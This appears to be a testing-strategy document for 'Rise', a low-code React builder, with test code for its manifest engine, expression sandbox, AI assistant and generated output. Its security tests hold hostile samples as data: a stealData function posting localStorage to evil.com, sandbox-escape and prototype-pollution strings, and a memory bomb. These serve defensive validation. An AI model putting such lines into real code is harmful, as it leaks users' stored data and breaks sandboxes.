# Testing Strategy

## Overview

Testing a visual low-code development tool like Rise requires a multi-layered approach that covers:

1. **🔧 Core Engine Testing**: Manifest management, code generation, expression evaluation
2. **🎨 Visual Editor Testing**: UI interactions, drag-and-drop, property editing
3. **🤖 AI Integration Testing**: Code generation, review, and suggestion quality
4. **🔒 Security Testing**: Expression sandboxing, custom function safety
5. **📱 Generated Code Testing**: Quality and correctness of output

---

## Testing Pyramid for Visual Development Tools

```
                    🎭 Manual Testing
                   (UX, AI Quality, Edge Cases)
                         
                  📱 E2E Testing
                (Full workflows, integration)
                  
               🔌 Integration Testing  
             (Components working together)
             
          🔧 Unit Testing
        (Core functions, utilities)
```

---

## 1. Unit Testing (Foundation Layer)

### Core Engine Components

#### Manifest Management
```typescript
// tests/manifest/ManifestManager.test.ts
import { ManifestManager } from '../src/engine/manifest/ManifestManager';

describe('ManifestManager', () => {
  let manager: ManifestManager;
  
  beforeEach(() => {
    manager = new ManifestManager();
  });
  
  describe('component operations', () => {
    test('adds component to manifest', () => {
      const component = {
        id: 'comp_001',
        displayName: 'Button',
        type: 'button'
      };
      
      manager.addComponent('root', component);
      
      expect(manager.getComponent('comp_001')).toEqual(component);
      expect(manager.getComponent('root').children).toContain('comp_001');
    });
    
    test('validates component schema', () => {
      const invalidComponent = {
        // Missing required id field
        displayName: 'Invalid',
        type: 'button'
      };
      
      expect(() => {
        manager.addComponent('root', invalidComponent);
      }).toThrow('Component must have an id');
    });
    
    test('prevents circular dependencies', () => {
      manager.addComponent('root', { id: 'comp_A', children: ['comp_B'] });
      manager.addComponent('root', { id: 'comp_B', children: ['comp_C'] });
      
      expect(() => {
        manager.addComponent('comp_C', { id: 'comp_A' }); // Would create cycle
      }).toThrow('Circular dependency detected');
    });
  });
  
  describe('manifest validation', () => {
    test('validates complete manifest structure', () => {
      const manifest = createValidManifest();
      const result = manager.validate(manifest);
      
      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual([]);
    });
    
    test('detects invalid property types', () => {
      const manifest = {
        components: {
          comp_001: {
            properties: {
              invalidProp: {
                type: 'unknown-type', // Invalid
                value: 'test'
              }
            }
          }
        }
      };
      
      const result = manager.validate(manifest);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Unknown property type: unknown-type');
    });
  });
});
```

#### Expression Validation
```typescript
// tests/expressions/ExpressionValidator.test.ts
import { ExpressionValidator } from '../src/engine/expressions/ExpressionValidator';

describe('ExpressionValidator', () => {
  let validator: ExpressionValidator;
  
  beforeEach(() => {
    validator = new ExpressionValidator();
  });
  
  describe('simple expressions (sandboxed)', () => {
    test('allows safe expressions', () => {
      const safeExpressions = [
        'user.name',
        'items.length > 0',
        'Math.round(price * 1.1)',
        'user.firstName + " " + user.lastName',
        'theme === "dark" ? "bg-gray-900" : "bg-white"'
      ];
      
      safeExpressions.forEach(expr => {
        const result = validator.validateExpression(expr);
        expect(result.isValid).toBe(true);
        expect(result.violations).toEqual([]);
      });
    });
    
    test('blocks dangerous expressions', () => {
      const dangerousExpressions = [
        'fetch("/api/data")',
        'localStorage.setItem("key", "value")',
        'eval("malicious code")',
        'document.createElement("script")',
        'window.location = "https://evil.com"',
        'while(true) { }'
      ];
      
      dangerousExpressions.forEach(expr => {
        const result = validator.validateExpression(expr);
        expect(result.isValid).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });
    
    test('detects syntax errors', () => {
      const syntaxErrors = [
        'user.name +', // Incomplete
        'if (true { }', // Missing parenthesis
        'user..name', // Double dot
        'function() { }' // Function declaration not allowed
      ];
      
      syntaxErrors.forEach(expr => {
        const result = validator.validateExpression(expr);
        expect(result.isValid).toBe(false);
        expect(result.violations[0]).toContain('Syntax error');
      });
    });
  });
  
  describe('custom functions (full power)', () => {
    test('allows any valid JavaScript', () => {
      const powerfulFunctions = [
        'async function fetchData() { return await fetch("/api/data"); }',
        'function saveToStorage(key, value) { localStorage.setItem(key, value); }',
        'function processPayment() { return stripe.createToken(); }'
      ];
      
      powerfulFunctions.forEach(fn => {
        const result = validator.validateCustomFunction(fn);
        expect(result.isValid).toBe(true);
      });
    });
    
    test('provides security warnings', () => {
      const riskyFunction = `
        function stealData() {
          fetch('https://evil.com/steal', {
            method: 'POST',
            body: JSON.stringify(localStorage)
          });
        }
      `;
      
      const result = validator.validateCustomFunction(riskyFunction);
      expect(result.isValid).toBe(true); // Allowed but warned
      expect(result.warnings).toContain('External API call detected');
      expect(result.warnings).toContain('localStorage access detected');
    });
  });
});
```

#### Code Generation
```typescript
// tests/generator/ReactGenerator.test.ts
import { ReactGenerator } from '../src/engine/generator/ReactGenerator';

describe('ReactGenerator', () => {
  let generator: ReactGenerator;
  
  beforeEach(() => {
    generator = new ReactGenerator();
  });
  
  test('generates valid React component', () => {
    const manifest = {
      id: 'comp_001',
      displayName: 'UserCard',
      properties: {
        user: { type: 'prop', dataType: 'object' },
        displayName: { 
          type: 'expression', 
          expression: 'user.firstName + " " + user.lastName' 
        }
      }
    };
    
    const code = generator.generateComponent(manifest);
    
    // Check structure
    expect(code).toContain('export default function UserCard');
    expect(code).toContain('const displayName = user.firstName + " " + user.lastName');
    expect(code).toContain('PropTypes');
    
    // Validate syntax
    expect(() => {
      require('@babel/parser').parse(code, { sourceType: 'module', plugins: ['jsx'] });
    }).not.toThrow();
    
    // Check for proper imports
    expect(code).toMatch(/import React/);
    expect(code).toMatch(/import PropTypes/);
  });
  
  test('generates proper PropTypes', () => {
    const manifest = {
      id: 'comp_001',
      displayName: 'TestComponent',
      properties: {
        title: { type: 'prop', dataType: 'string', required: true },
        count: { type: 'prop', dataType: 'number', required: false },
        items: { type: 'prop', dataType: 'array', required: true }
      }
    };
    
    const code = generator.generateComponent(manifest);
    
    expect(code).toContain('title: PropTypes.string.isRequired');
    expect(code).toContain('count: PropTypes.number');
    expect(code).toContain('items: PropTypes.array.isRequired');
  });
  
  test('handles custom functions', () => {
    const manifest = {
      id: 'comp_001',
      displayName: 'TestComponent',
      properties: {
        formattedDate: {
          type: 'customFunction',
          functionName: 'formatDate',
          args: ['props.createdAt', '"YYYY-MM-DD"']
        }
      }
    };
    
    const code = generator.generateComponent(manifest);
    
    expect(code).toContain('import { formatDate } from');
    expect(code).toContain('formatDate(createdAt, "YYYY-MM-DD")');
  });
});
```

### AI Integration Components
```typescript
// tests/ai/AIAssistant.test.ts
import { AIAssistant } from '../src/engine/ai/AIAssistant';

describe('AIAssistant', () => {
  let ai: AIAssistant;
  
  beforeEach(() => {
    ai = new AIAssistant({ apiKey: 'test-key', provider: 'mock' });
  });
  
  test('generates component from description', async () => {
    const prompt = 'Create a button component with title and onClick handler';
    
    const result = await ai.generateComponent(prompt);
    
    expect(result.success).toBe(true);
    expect(result.component.displayName).toBe('Button');
    expect(result.component.properties.title).toBeDefined();
    expect(result.component.eventHandlers.onClick).toBeDefined();
  });
  
  test('handles invalid prompts gracefully', async () => {
    const prompt = ''; // Empty prompt
    
    const result = await ai.generateComponent(prompt);
    
    expect(result.success).toBe(false);
    expect(result.error).toContain('prompt');
  });
  
  test('sanitizes code before sending to AI', () => {
    const codeWithSecrets = `
      const apiKey = "sk-1234567890abcdef";
      const password = "secret123";
      fetch("https://api.example.com/data");
    `;
    
    const sanitized = ai.sanitizeCodeForReview(codeWithSecrets);
    
    expect(sanitized).not.toContain('sk-1234567890abcdef');
    expect(sanitized).not.toContain('secret123');
    expect(sanitized).toContain('[REDACTED]');
  });
});
```

---

## 2. Integration Testing (Component Interaction)

### Visual Editor Integration
```typescript
// tests/integration/VisualEditor.test.ts
import { render, screen, fireEvent } from '@testing-library/react';
import { VisualEditor } from '../src/renderer/components/VisualEditor';

describe('Visual Editor Integration', () => {
  test('complete component creation workflow', async () => {
    const { getByTestId, getByText } = render(<VisualEditor />);
    
    // 1. Add component to tree
    const addButton = getByTestId('add-component-button');
    fireEvent.click(addButton);
    
    const buttonOption = getByText('Button');
    fireEvent.click(buttonOption);
    
    // 2. Edit properties
    const propertyPanel = getByTestId('property-panel');
    expect(propertyPanel).toBeInTheDocument();
    
    const titleInput = getByTestId('property-title-input');
    fireEvent.change(titleInput, { target: { value: 'Click me!' } });
    
    // 3. Verify manifest update
    await waitFor(() => {
      const manifestPreview = getByTestId('manifest-preview');
      expect(manifestPreview.textContent).toContain('"title": "Click me!"');
    });
    
    // 4. Check generated code
    const codeTab = getByTestId('code-tab');
    fireEvent.click(codeTab);
    
    const codeEditor = getByTestId('code-editor');
    expect(codeEditor.textContent).toContain('Click me!');
  });
  
  test('expression editor integration', async () => {
    const { getByTestId } = render(<VisualEditor />);
    
    // Create component with expression
    // ... setup code ...
    
    const expressionButton = getByTestId('expression-toggle');
    fireEvent.click(expressionButton);
    
    const expressionEditor = getByTestId('expression-editor');
    fireEvent.change(expressionEditor, { 
      target: { value: 'user.name.toUpperCase()' } 
    });
    
    // Verify validation
    await waitFor(() => {
      const validationIcon = getByTestId('expression-validation');
      expect(validationIcon).toHaveClass('valid');
    });
    
    // Verify autocomplete
    fireEvent.change(expressionEditor, { 
      target: { value: 'user.' } 
    });
    
    await waitFor(() => {
      const autocomplete = getByTestId('expression-autocomplete');
      expect(autocomplete).toBeInTheDocument();
      expect(autocomplete.textContent).toContain('name');
      expect(autocomplete.textContent).toContain('email');
    });
  });
});
```

### Code Generation Pipeline
```typescript
// tests/integration/CodeGeneration.test.ts
describe('Code Generation Pipeline', () => {
  test('manifest → code → compilation', async () => {
    const manifest = createComplexManifest();
    
    // 1. Generate code
    const generator = new ReactGenerator();
    const files = generator.generateProject(manifest);
    
    expect(files).toHaveProperty('src/App.jsx');
    expect(files).toHaveProperty('src/components/UserCard.jsx');
    expect(files).toHaveProperty('src/utils/globalFunctions.js');
    
    // 2. Write to temporary directory
    const tempDir = await createTempProject(files);
    
    // 3. Install dependencies
    await execAsync('npm install', { cwd: tempDir });
    
    // 4. Verify compilation
    const buildResult = await execAsync('npm run build', { cwd: tempDir });
    expect(buildResult.exitCode).toBe(0);
    
    // 5. Verify generated files exist
    expect(fs.existsSync(path.join(tempDir, 'dist/index.html'))).toBe(true);
    expect(fs.existsSync(path.join(tempDir, 'dist/assets'))).toBe(true);
    
    // 6. Cleanup
    await fs.rm(tempDir, { recursive: true });
  });
  
  test('hot reload functionality', async () => {
    const project = await createTestProject();
    
    // Start dev server
    const devServer = startDevServer(project.path);
    await waitForServer(devServer.port);
    
    // Make change to manifest
    const updatedManifest = {
      ...project.manifest,
      components: {
        ...project.manifest.components,
        comp_001: {
          ...project.manifest.components.comp_001,
          properties: {
            title: { type: 'static', value: 'Updated Title' }
          }
        }
      }
    };
    
    // Trigger regeneration
    await project.updateManifest(updatedManifest);
    
    // Verify hot reload
    await waitFor(async () => {
      const response = await fetch(`http://localhost:${devServer.port}`);
      const html = await response.text();
      expect(html).toContain('Updated Title');
    }, { timeout: 5000 });
    
    devServer.stop();
  });
});
```

---

## 3. End-to-End Testing (User Workflows)

### Complete User Journeys
```typescript
// tests/e2e/UserJourneys.test.ts
import { test, expect } from '@playwright/test';

test.describe('Rise User Journeys', () => {
  test('new user creates first project', async ({ page }) => {
    // Start app
    await page.goto('app://rise-editor');
    
    // Welcome screen
    await expect(page.locator('[data-testid="welcome-screen"]')).toBeVisible();
    
    // Create new project
    await page.click('[data-testid="new-project-button"]');
    
    await page.fill('[data-testid="project-name"]', 'My First App');
    await page.selectOption('[data-testid="framework-select"]', 'react');
    await page.click('[data-testid="create-project-button"]');
    
    // Wait for project to load
    await expect(page.locator('[data-testid="component-tree"]')).toBeVisible();
    await expect(page.locator('[data-testid="preview-panel"]')).toBeVisible();
    
    // Add first component
    await page.click('[data-testid="add-component-button"]');
    await page.click('[data-testid="component-type-button"]');
    
    // Configure component
    await page.fill('[data-testid="property-title"]', 'Hello World');
    
    // Verify preview updates
    const preview = page.frameLocator('[data-testid="preview-iframe"]');
    await expect(preview.locator('button')).toContainText('Hello World');
    
    // Save project
    await page.keyboard.press('Control+S');
    await expect(page.locator('[data-testid="save-indicator"]')).toContainText('Saved');
  });
  
  test('AI component generation workflow', async ({ page }) => {
    await setupExistingProject(page);
    
    // Open AI assistant
    await page.keyboard.press('Control+K');
    await expect(page.locator('[data-testid="ai-modal"]')).toBeVisible();
    
    // Enter prompt
    await page.fill('[data-testid="ai-prompt"]', 
      'Create a user profile card with avatar, name, and edit button');
    
    await page.click('[data-testid="ai-generate-button"]');
    
    // Wait for AI response
    await expect(page.locator('[data-testid="ai-thinking"]')).toBeVisible();
    await expect(page.locator('[data-testid="ai-result"]')).toBeVisible({ timeout: 10000 });
    
    // Review generated component
    await expect(page.locator('[data-testid="ai-result"]')).toContainText('UserProfileCard');
    
    // Accept suggestion
    await page.click('[data-testid="ai-accept-button"]');
    
    // Verify component added to tree
    await expect(page.locator('[data-testid="component-tree"]'))
      .toContainText('UserProfileCard');
    
    // Verify properties panel shows AI-generated properties
    await expect(page.locator('[data-testid="property-panel"]'))
      .toContainText('avatar');
  });
  
  test('expression editing with validation', async ({ page }) => {
    await setupProjectWithComponent(page);
    
    // Select component property
    await page.click('[data-testid="property-displayName"]');
    
    // Switch to expression mode
    await page.click('[data-testid="expression-toggle"]');
    
    // Enter invalid expression
    await page.fill('[data-testid="expression-editor"]', 'fetch("/api/data")');
    
    // Verify validation error
    await expect(page.locator('[data-testid="expression-error"]'))
      .toContainText('Blocked function call: fetch');
    
    // Enter valid expression
    await page.fill('[data-testid="expression-editor"]', 
      'user.firstName + " " + user.lastName');
    
    // Verify validation success
    await expect(page.locator('[data-testid="expression-valid"]')).toBeVisible();
    
    // Verify autocomplete
    await page.fill('[data-testid="expression-editor"]', 'user.');
    await expect(page.locator('[data-testid="autocomplete-menu"]')).toBeVisible();
    await expect(page.locator('[data-testid="autocomplete-menu"]'))
      .toContainText('firstName');
  });
  
  test('custom function creation and usage', async ({ page }) => {
    await setupExistingProject(page);
    
    // Open global functions panel
    await page.click('[data-testid="global-functions-tab"]');
    
    // Create new function
    await page.click('[data-testid="add-function-button"]');
    await page.fill('[data-testid="function-name"]', 'formatCurrency');
    
    // Enter function code
    const functionCode = `
      function formatCurrency(amount, currency = 'USD') {
        return new Intl.NumberFormat('en-US', {
          style: 'currency',
          currency: currency
        }).format(amount);
      }
    `;
    
    await page.fill('[data-testid="function-editor"]', functionCode);
    
    // Save function
    await page.click('[data-testid="save-function-button"]');
    
    // Use function in component property
    await page.click('[data-testid="component-tree"] >> text=ProductCard');
    await page.click('[data-testid="property-price"]');
    await page.selectOption('[data-testid="property-type"]', 'customFunction');
    await page.selectOption('[data-testid="function-select"]', 'formatCurrency');
    
    // Verify function call in generated code
    await page.click('[data-testid="code-tab"]');
    await expect(page.locator('[data-testid="code-editor"]'))
      .toContainText('formatCurrency(price');
  });
});
```

### Performance Testing
```typescript
// tests/e2e/Performance.test.ts
test.describe('Performance Tests', () => {
  test('handles large component trees', async ({ page }) => {
    await setupExistingProject(page);
    
    // Create 100 components programmatically
    for (let i = 0; i < 100; i++) {
      await page.evaluate((index) => {
        window.riseAPI.addComponent(`comp_${index}`, {
          displayName: `Component${index}`,
          type: 'div'
        });
      }, i);
    }
    
    // Measure tree rendering performance
    const startTime = Date.now();
    await expect(page.locator('[data-testid="component-tree"]')).toBeVisible();
    const renderTime = Date.now() - startTime;
    
    expect(renderTime).toBeLessThan(2000); // Should render in < 2 seconds
    
    // Test scrolling performance
    await page.evaluate(() => {
      const tree = document.querySelector('[data-testid="component-tree"]');
      tree.scrollTop = tree.scrollHeight;
    });
    
    // Verify UI remains responsive
    await page.click('[data-testid="add-component-button"]');
    await expect(page.locator('[data-testid="component-selector"]')).toBeVisible();
  });
  
  test('expression evaluation performance', async ({ page }) => {
    await setupProjectWithComponent(page);
    
    // Add complex expression
    const complexExpression = 'items.filter(i => i.active).map(i => i.name).join(", ")';
    await page.fill('[data-testid="expression-editor"]', complexExpression);
    
    // Measure evaluation time
    const startTime = await page.evaluate(() => performance.now());
    
    // Trigger expression evaluation
    await page.dispatchEvent('[data-testid="expression-editor"]', 'blur');
    
    const endTime = await page.evaluate(() => performance.now());
    const evaluationTime = endTime - startTime;
    
    expect(evaluationTime).toBeLessThan(100); // Should evaluate in < 100ms
  });
});
```

---

## 4. Security Testing

### Expression Sandboxing
```typescript
// tests/security/ExpressionSecurity.test.ts
describe('Expression Security', () => {
  test('prevents code execution attacks', () => {
    const maliciousExpressions = [
      'eval("alert(\'XSS\')")',
      'Function("return process")().exit()',
      'constructor.constructor("return process")()',
      'this.constructor.constructor("return process")()',
      '__proto__.constructor.constructor("return process")()'
    ];
    
    const validator = new ExpressionValidator();
    
    maliciousExpressions.forEach(expr => {
      const result = validator.validateExpression(expr);
      expect(result.isValid).toBe(false);
      expect(result.violations).toContainEqual(
        expect.stringContaining('Blocked')
      );
    });
  });
  
  test('prevents prototype pollution', () => {
    const pollutionAttempts = [
      '__proto__.isAdmin = true',
      'constructor.prototype.isAdmin = true',
      'Object.prototype.isAdmin = true',
      'Array.prototype.isAdmin = true'
    ];
    
    const validator = new ExpressionValidator();
    
    pollutionAttempts.forEach(expr => {
      const result = validator.validateExpression(expr);
      expect(result.isValid).toBe(false);
    });
  });
  
  test('sandbox execution limits', async () => {
    const executor = new ExpressionExecutor();
    
    // Test infinite loop detection
    const infiniteLoop = 'while(true) { }';
    
    await expect(
      executor.execute(infiniteLoop, {})
    ).rejects.toThrow('execution timed out');
    
    // Test memory limits
    const memoryBomb = 'new Array(1000000).fill("x".repeat(1000))';
    
    await expect(
      executor.execute(memoryBomb, {})
    ).rejects.toThrow('memory limit exceeded');
  });
});
```

### AI Security Testing
```typescript
// tests/security/AISecurity.test.ts
describe('AI Security', () => {
  test('sanitizes sensitive data before AI calls', () => {
    const codeWithSecrets = `
      const apiKey = "sk-1234567890abcdef";
      const dbPassword = "secret123";
      const privateKey = "-----BEGIN PRIVATE KEY-----";
      fetch("https://internal-api.company.com/data");
    `;
    
    const sanitizer = new CodeSanitizer();
    const sanitized = sanitizer.sanitizeForAI(codeWithSecrets);
    
    // API keys should be redacted
    expect(sanitized).not.toContain('sk-1234567890abcdef');
    expect(sanitized).toContain('API_KEY="[REDACTED]"');
    
    // Passwords should be redacted
    expect(sanitized).not.toContain('secret123');
    expect(sanitized).toContain('password="[REDACTED]"');
    
    // Private keys should be redacted
    expect(sanitized).not.toContain('-----BEGIN PRIVATE KEY-----');
    
    // Internal URLs should be generalized
    expect(sanitized).not.toContain('internal-api.company.com');
    expect(sanitized).toContain('api.example.com');
  });
  
  test('validates AI-generated code', async () => {
    const mockAI = new MockAIProvider();
    
    // Mock malicious AI response
    mockAI.setNextResponse({
      component: {
        displayName: 'MaliciousComponent',
        properties: {
          evilProp: {
            type: 'expression',
            expression: 'eval("alert(\'hacked\')")'
          }
        }
      }
    });
    
    const aiAssistant = new AIAssistant({ provider: mockAI });
    const result = await aiAssistant.generateComponent('Create a button');
    
    // AI-generated expressions should still be validated
    expect(result.warnings).toContainEqual(
      expect.stringContaining('security concern')
    );
    expect(result.component.properties.evilProp.expression)
      .not.toContain('eval');
  });
});
```

---

## 5. Generated Code Quality Testing

### Code Quality Validation
```typescript
// tests/quality/GeneratedCodeQuality.test.ts
describe('Generated Code Quality', () => {
  test('passes ESLint validation', async () => {
    const manifest = createComplexManifest();
    const generator = new ReactGenerator();
    const code = generator.generateComponent(manifest.components.userCard);
    
    const eslint = new ESLint({
      useEslintrc: false,
      overrideConfig: {
        extends: ['react-app', 'react-app/jest'],
        parserOptions: {
          ecmaVersion: 2020,
          sourceType: 'module',
          ecmaFeatures: { jsx: true }
        }
      }
    });
    
    const results = await eslint.lintText(code, { filePath: 'TestComponent.jsx' });
    
    expect(results[0].errorCount).toBe(0);
    expect(results[0].warningCount).toBe(0);
  });
  
  test('generates proper TypeScript types', async () => {
    const manifest = createTypedManifest();
    const generator = new ReactGenerator({ typescript: true });
    const code = generator.generateComponent(manifest.components.userCard);
    
    // Should have proper interface
    expect(code).toMatch(/interface.*Props/);
    expect(code).toContain('React.FC<');
    
    // Validate TypeScript compilation
    const ts = require('typescript');
    const result = ts.transpileModule(code, {
      compilerOptions: {
        target: ts.ScriptTarget.ES2015,
        module: ts.ModuleKind.CommonJS,
        jsx: ts.JsxEmit.React,
        strict: true
      }
    });
    
    expect(result.diagnostics).toEqual([]);
  });
  
  test('generates accessible components', () => {
    const manifest = {
      id: 'comp_001',
      displayName: 'Button',
      properties: {
        onClick: { type: 'eventHandler' },
        disabled: { type: 'prop', dataType: 'boolean' }
      },
      accessibility: {
        role: 'button',
        ariaLabel: 'props.title'
      }
    };
    
    const generator = new ReactGenerator();
    const code = generator.generateComponent(manifest);
    
    // Should include accessibility attributes
    expect(code).toContain('role="button"');
    expect(code).toContain('aria-label=');
    
    // Should handle keyboard navigation
    expect(code).toContain('onKeyDown');
    expect(code).toMatch(/key.*Enter|Space/);
  });
});
```

### Runtime Testing of Generated Components
```typescript
// tests/quality/RuntimeTesting.test.ts
describe('Generated Component Runtime', () => {
  test('components render without errors', () => {
    const manifest = createComponentManifest();
    const generator = new ReactGenerator();
    const componentCode = generator.generateComponent(manifest);
    
    // Dynamically import and test component
    const Component = requireFromString(componentCode, 'TestComponent.jsx');
    
    const testProps = {
      user: { id: 1, name: 'John Doe', email: 'john@example.com' },
      onClick: jest.fn()
    };
    
    const { getByRole } = render(<Component {...testProps} />);
    
    // Should render without throwing
    expect(getByRole('button')).toBeInTheDocument();
    expect(getByRole('button')).toHaveTextContent('John Doe');
  });
  
  test('expressions evaluate correctly', () => {
    const manifest = {
      id: 'comp_001',
      displayName: 'UserCard',
      properties: {
        displayName: {
          type: 'expression',
          expression: 'user.firstName + " " + user.lastName'
        },
        isActive: {
          type: 'expression',
          expression: 'user.status === "active"'
        }
      }
    };
    
    const Component = generateAndImportComponent(manifest);
    
    const testProps = {
      user: { 
        firstName: 'John', 
        lastName: 'Doe', 
        status: 'active' 
      }
    };
    
    const { container } = render(<Component {...testProps} />);
    
    expect(container.textContent).toContain('John Doe');
    expect(container.querySelector('.active')).toBeInTheDocument();
  });
  
  test('custom functions execute correctly', async () => {
    const globalFunctions = `
      export function formatCurrency(amount) {
        return new Intl.NumberFormat('en-US', {
          style: 'currency',
          currency: 'USD'
        }).format(amount);
      }
    `;
    
    const manifest = {
      id: 'comp_001',
      displayName: 'ProductCard',
      properties: {
        formattedPrice: {
          type: 'customFunction',
          functionName: 'formatCurrency',
          args: ['props.price']
        }
      }
    };
    
    // Setup global functions
    const globalFunctionsModule = requireFromString(globalFunctions);
    global.formatCurrency = globalFunctionsModule.formatCurrency;
    
    const Component = generateAndImportComponent(manifest);
    
    const { container } = render(<Component price={29.99} />);
    
    expect(container.textContent).toContain('$29.99');
  });
});
```

---

## 6. Performance Testing

### Load Testing
```typescript
// tests/performance/LoadTesting.test.ts
describe('Performance under load', () => {
  test('handles large manifests efficiently', async () => {
    const largeManifest = generateManifestWithComponents(1000);
    
    const startTime = performance.now();
    
    const manager = new ManifestManager();
    await manager.load(largeManifest);
    
    const loadTime = performance.now() - startTime;
    expect(loadTime).toBeLessThan(1000); // Should load in < 1 second
    
    // Test operations on large manifest
    const operationStart = performance.now();
    manager.addComponent('root', { id: 'new_comp', type: 'button' });
    const operationTime = performance.now() - operationStart;
    
    expect(operationTime).toBeLessThan(50); // Operations should be fast
  });
  
  test('expression evaluation scales with complexity', () => {
    const expressions = [
      'user.name', // Simple
      'user.firstName + " " + user.lastName', // Medium
      'items.filter(i => i.active).map(i => i.name).slice(0, 10).join(", ")', // Complex
      'data.reduce((acc, item) => acc + item.values.map(v => v * 2).reduce((a, b) => a + b, 0), 0)' // Very complex
    ];
    
    const executor = new ExpressionExecutor();
    const context = {
      user: { firstName: 'John', lastName: 'Doe', name: 'John Doe' },
      items: Array(100).fill({ active: true, name: 'Item' }),
      data: Array(50).fill({ values: [1, 2, 3, 4, 5] })
    };
    
    expressions.forEach((expr, index) => {
      const times: number[] = [];
      
      // Run expression 10 times
      for (let i = 0; i < 10; i++) {
        const start = performance.now();
        executor.execute(expr, context);
        const time = performance.now() - start;
        times.push(time);
      }
      
      const avgTime = times.reduce((a, b) => a + b) / times.length;
      
      // Even complex expressions should be fast
      expect(avgTime).toBeLessThan(10); // < 10ms average
    });
  });
});
```

---

## 7. Manual Testing Checklist

### UX/UI Testing
```
🎨 Visual Editor UX:
□ Component tree feels responsive and intuitive
□ Drag-and-drop works smoothly
□ Property panel updates instantly
□ Context menus appear in logical places
□ Keyboard shortcuts work consistently

🤖 AI Integration UX:
□ AI suggestions feel helpful, not intrusive
□ AI generation time feels reasonable (< 10 seconds)
□ User can easily accept/reject AI suggestions
□ AI explanations are clear and actionable
□ Fallback when AI is unavailable works well

📱 Preview System UX:
□ Preview updates feel instant (< 500ms)
□ Error states are clear and helpful
□ Responsive preview works across screen sizes
□ Hot reload doesn't lose user state unexpectedly

🔧 Expression Editor UX:
□ Autocomplete feels natural and fast
□ Syntax highlighting is helpful
□ Error messages are clear and actionable
□ Switching between modes is seamless
```

### Edge Case Testing
```
🔍 Edge Cases to Test Manually:

Component Management:
□ Very deeply nested components (10+ levels)
□ Components with circular reference attempts
□ Deleting components with many dependencies
□ Renaming components used in expressions
□ Copy/paste complex component structures

Expression Edge Cases:
□ Very long expressions (1000+ characters)
□ Expressions with special characters and unicode
□ Expressions referencing non-existent properties
□ Expressions with deeply nested object access
□ Expressions that change frequently (performance)

AI Edge Cases:
□ AI generating invalid/impossible components
□ AI taking very long to respond (timeout handling)
□ AI generating components with security issues
□ Very long/complex user prompts
□ Non-English prompts and responses

File System Edge Cases:
□ Very large projects (100+ components)
□ Projects with missing files
□ Corrupted manifest files
□ Read-only file system permissions
□ Network drives or cloud storage
```

---

## 8. Test Automation Pipeline

### CI/CD Integration
```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      - run: npm ci
      - run: npm run test:unit
      - run: npm run test:coverage
      
  integration-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run test:integration
      
  e2e-tests:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run build
      - run: npm run test:e2e
      - uses: actions/upload-artifact@v3
        if: failure()
        with:
          name: e2e-screenshots-${{ matrix.os }}
          path: tests/e2e/screenshots/
          
  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run test:security
      - run: npm audit
```

### Test Data Management
```typescript
// tests/fixtures/TestDataFactory.ts
export class TestDataFactory {
  static createBasicManifest() {
    return {
      schemaVersion: '1.0.0',
      metadata: {
        projectName: 'Test Project',
        framework: 'react'
      },
      components: {
        root: {
          id: 'root',
          displayName: 'App',
          type: 'app',
          children: []
        }
      },
      globalFunctions: {},
      globalState: {}
    };
  }
  
  static createComplexComponent() {
    return {
      id: 'comp_user_card_001',
      displayName: 'UserCard',
      type: 'composite',
      properties: {
        user: { type: 'prop', dataType: 'object', required: true },
        displayName: {
          type: 'expression',
          expression: 'user.firstName + " " + user.lastName'
        },
        avatarUrl: {
          type: 'customFunction',
          functionName: 'getAvatarUrl',
          args: ['props.user.id']
        }
      },
      eventHandlers: {
        onClick: {
          type: 'navigation',
          target: '/profile/${props.user.id}'
        }
      }
    };
  }
  
  static createMockAIResponse() {
    return {
      success: true,
      component: this.createComplexComponent(),
      confidence: 0.95,
      explanation: 'Generated user card component with avatar and navigation'
    };
  }
}
```

---

## 9. Testing Tools & Setup

### Essential Testing Dependencies
```json
{
  "devDependencies": {
    // Unit Testing
    "@testing-library/react": "^13.4.0",
    "@testing-library/jest-dom": "^5.16.5",
    "@testing-library/user-event": "^14.4.3",
    "jest": "^29.5.0",
    "jest-environment-jsdom": "^29.5.0",
    
    // E2E Testing
    "@playwright/test": "^1.35.0",
    "electron-playwright-helpers": "^1.7.1",
    
    // Code Quality
    "eslint": "^8.45.0",
    "eslint-plugin-testing-library": "^5.11.0",
    "eslint-plugin-jest-dom": "^5.0.1",
    
    // Security Testing
    "audit-ci": "^6.6.1",
    "semgrep": "^1.31.1",
    
    // Performance Testing
    "autocannon": "^7.12.0",
    "clinic": "^11.0.1",
    
    // Mocking
    "msw": "^1.2.2",
    "jest-electron": "^0.1.12"
  }
}
```

### Test Configuration
```javascript
// jest.config.js
module.exports = {
  testEnvironment: 'jsdom',
  setupFilesAfterEnv: ['<rootDir>/tests/setup.ts'],
  moduleNameMapping: {
    '^@/(.*)$': '<rootDir>/src/$1'
  },
  collectCoverageFrom: [
    'src/**/*.{ts,tsx}',
    '!src/**/*.d.ts',
    '!src/**/*.stories.tsx'
  ],
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    }
  },
  testMatch: [
    '<rootDir>/tests/**/*.test.{ts,tsx}'
  ]
};
```

---

## 10. Success Metrics

### Testing KPIs
```
🎯 Coverage Targets:
- Unit Test Coverage: > 85%
- Integration Test Coverage: > 75%
- E2E Test Coverage: > 60%
- Security Test Coverage: 100% of attack vectors

📈 Performance Targets:
- Unit Tests: Complete in < 30 seconds
- Integration Tests: Complete in < 2 minutes  
- E2E Tests: Complete in < 10 minutes
- Full Suite: Complete in < 15 minutes

🔍 Quality Metrics:
- Generated Code ESLint Score: 0 errors, < 5 warnings
- AI Generation Success Rate: > 80%
- Expression Security Block Rate: 100% of dangerous patterns
- User Journey Completion Rate: > 95%
